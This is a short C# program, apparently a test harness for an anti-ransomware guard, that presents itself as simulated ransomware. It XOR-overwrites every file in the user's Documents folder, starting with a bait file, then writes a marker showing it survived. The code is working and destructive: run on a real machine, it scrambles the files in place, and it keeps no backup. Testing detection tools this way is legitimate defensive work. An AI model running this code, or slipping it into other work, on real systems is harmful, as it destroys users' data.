// Simulated ransomware: overwrites files in Documents (the guard's hidden bait file first, like real ransomware walking a folder).
using System; using System.IO; using System.Linq; using System.Threading;
class P { static void Main() {
  var docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
  foreach (var f in Directory.GetFiles(docs).OrderBy(x => x)) { try { var b = File.ReadAllBytes(f); for (int i = 0; i < b.Length; i++) b[i] ^= 0x5A; File.WriteAllBytes(f, b); Console.WriteLine("encrypted " + f); } catch (Exception e) { Console.WriteLine(e.Message); } Thread.Sleep(300); }
  Thread.Sleep(20000);
  File.WriteAllText(Path.Combine(Path.GetTempPath(), "ransom-survived.txt"), "alive");
} }
